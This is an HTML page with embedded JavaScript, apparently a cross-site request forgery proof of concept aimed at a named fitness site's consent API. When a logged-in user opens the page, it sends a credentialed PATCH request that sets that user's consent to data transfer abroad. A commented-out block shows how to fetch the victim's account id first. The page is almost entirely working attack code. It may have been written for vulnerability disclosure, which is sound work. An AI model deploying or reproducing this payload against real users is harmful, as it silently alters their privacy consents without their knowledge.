<!DOCTYPE html>
<html>
<body>
<script>
// 目标API地址
const apiUrl = 'https://www.myfitnesspal.com/api/idm/user-with-consents';

/*
let domainUserId = '';
const xhrGet = new XMLHttpRequest();
xhrGet.open('GET', apiUrl, false); 
xhrGet.withCredentials = true; 
xhrGet.send();

if (xhrGet.status === 200) {
  const resData = JSON.parse(xhrGet.responseText);
  domainUserId = resData.domainUserId; 
}
*/
  

const domainUserId = "1234567890"; 
if (domainUserId && domainUserId !== "Your_domainUserId") { 
  const xhrPatch = new XMLHttpRequest();
  xhrPatch.open('PATCH', apiUrl, true);
  xhrPatch.withCredentials = true;
  xhrPatch.setRequestHeader('Content-Type', 'application/json');
  const requestBody = {
    "account_links": [
      {
        "domain":"MFP",
        "domainUserId": domainUserId,
        "consent_matrix_version":"nc.20250403.01",
        "consents":{"transfer_outside_location":true},
        "ad_consents_last_seen":"2026-01-23T11:23:23.942Z"
      }
    ]
  };
  xhrPatch.send(JSON.stringify(requestBody));
}
</script>
</body>
</html>
